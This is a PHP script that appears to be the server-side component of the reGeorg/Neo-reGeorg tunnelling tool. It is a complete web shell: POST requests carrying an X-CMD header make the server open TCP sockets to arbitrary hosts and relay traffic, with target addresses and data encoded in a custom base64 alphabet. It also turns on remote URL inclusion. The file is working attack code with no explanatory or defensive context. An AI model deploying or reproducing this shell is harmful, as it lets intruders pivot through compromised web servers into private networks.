<?php
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
//dl("php_sockets.dll");

if( !function_exists('apache_request_headers') ) {
	function apache_request_headers() {
		$arh = array();
		$rx_http = '/\AHTTP_/';

		foreach($_SERVER as $key => $val) {
			if( preg_match($rx_http, $key) ) {
				$arh_key = preg_replace($rx_http, '', $key);
				$rx_matches = array();
				$rx_matches = explode('_', $arh_key);
				if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
					foreach($rx_matches as $ak_key => $ak_val) {
						$rx_matches[$ak_key] = ucfirst($ak_val);
					}

					$arh_key = implode('-', $rx_matches);
				}
				$arh[$arh_key] = $val;
			}
		}
		return($arh);
	}
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
	exit("Georg says, 'All seems fine'");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
	$cmd = $headers["X-CMD"];
	$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	$de = "BASE64 CHARSLIST";
	switch($cmd){
		case "CONNECT":
			{
				$target_ary = preg_split("/\|/", base64_decode(strtr($headers["X-TARGET"], $de, $en)), 2);
				$target = $target_ary[0];
				$port = (int)$target_ary[1];
				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				if ($sock === false)
				{
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed creating socket');
					return;
				}
				$res = @socket_connect($sock, $target, $port);
				if ($res === false)
				{
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed connecting to target');
					return;
				}
				socket_set_nonblock($sock);
				@session_start();
				$_SESSION["run"] = true;
				$_SESSION["writebuf"] = "";
				$_SESSION["readbuf"] = "";
				ob_end_clean();
				header('X-STATUS: OK');
				header("Connection: close");
				ignore_user_abort();
				ob_start();
				$size = ob_get_length();
				header("Content-Length: $size");
				ob_end_flush();
				flush();
				session_write_close();

				while ($_SESSION["run"])
				{
					$readBuff = "";
					@session_start();
					$writeBuff = $_SESSION["writebuf"];
					$_SESSION["writebuf"] = "";
					session_write_close();
					if ($writeBuff != "")
					{
						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
						if($i === false)
						{
							@session_start();
							$_SESSION["run"] = false;
							session_write_close();
							header('X-STATUS: FAIL');
							header('X-ERROR: Failed writing socket');
						}
					}
					while ($o = socket_read($sock, 512)) {
					if($o === false)
						{
							@session_start();
							$_SESSION["run"] = false;
							session_write_close();
							header('X-STATUS: FAIL');
							header('X-ERROR: Failed reading from socket');
						}
						$readBuff .= $o;
					}
					if ($readBuff!=""){
						@session_start();
						$_SESSION["readbuf"] .= $readBuff;
						session_write_close();
					}
				}
				socket_close($sock);
			}
			break;
		case "DISCONNECT":
			{
				error_log("DisConnect recieved");
				@session_start();
				$_SESSION["run"] = false;
				session_write_close();
				return;
			}
			break;
		case "READ":
			{
				@session_start();
				$readBuffer = $_SESSION["readbuf"];
				$_SESSION["readbuf"]="";
				$running = $_SESSION["run"];
				session_write_close();
				if ($running) {
					header('X-STATUS: OK');
					header("Connection: Keep-Alive");
					echo strtr(base64_encode($readBuffer), $en, $de);
					return;
				} else {
					header('X-STATUS: FAIL');
					return;
				}
			}
			break;
		case "FORWARD":
			{
				@session_start();
				$running = $_SESSION["run"];
				session_write_close();
				if(!$running){
					header('X-STATUS: FAIL');
					header('X-ERROR: No more running, close now');
					return;
				}
				header('Content-Type: application/octet-stream');
				$rawPostData = file_get_contents("php://input");
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= base64_decode(strtr($rawPostData, $de, $en));
					session_write_close();
					header('X-STATUS: OK');
					header("Connection: Keep-Alive");
					return;
				} else {
					header('X-STATUS: FAIL');
					header('X-ERROR: POST request read filed');
				}
			}
			break;
	}
}
?>
